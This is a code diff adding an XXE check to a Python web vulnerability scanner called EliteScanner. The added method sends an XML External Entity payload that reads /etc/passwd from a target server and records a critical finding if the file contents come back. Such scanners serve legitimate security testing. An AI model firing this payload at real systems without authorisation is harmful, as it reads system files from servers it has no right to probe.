@@ -542,6 +542,22 @@ class EliteScanner:
                       'details': f'File inclusion detected with: {payload}', 'url': test_url
                   })
            except: pass
+     def check_xxe(self):
+        """XML External Entity detection"""
+        print(f"{Fore.YELLOW}[!] Scanning for XXE vulnerabilities...")
+        payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
+        headers = {'Content-Type': 'application/xml'}
+        try:
+            resp = self.session.post(self.target, data=payload, headers=headers, timeout=5)
+            if "root:x:" in resp.text:
+                self.vulnerabilities.append({
+                    'name': 'XXE Vulnerability',
+                    'risk': 9, 'category': 'CRITICAL', 'confidence': 'High',
+                    'details': 'XML External Entity injection detected via POST request',
+                    'url': self.target
+                })
+        except:
+            pass
               
     def display_results(self):
         """Display comprehensive results"""
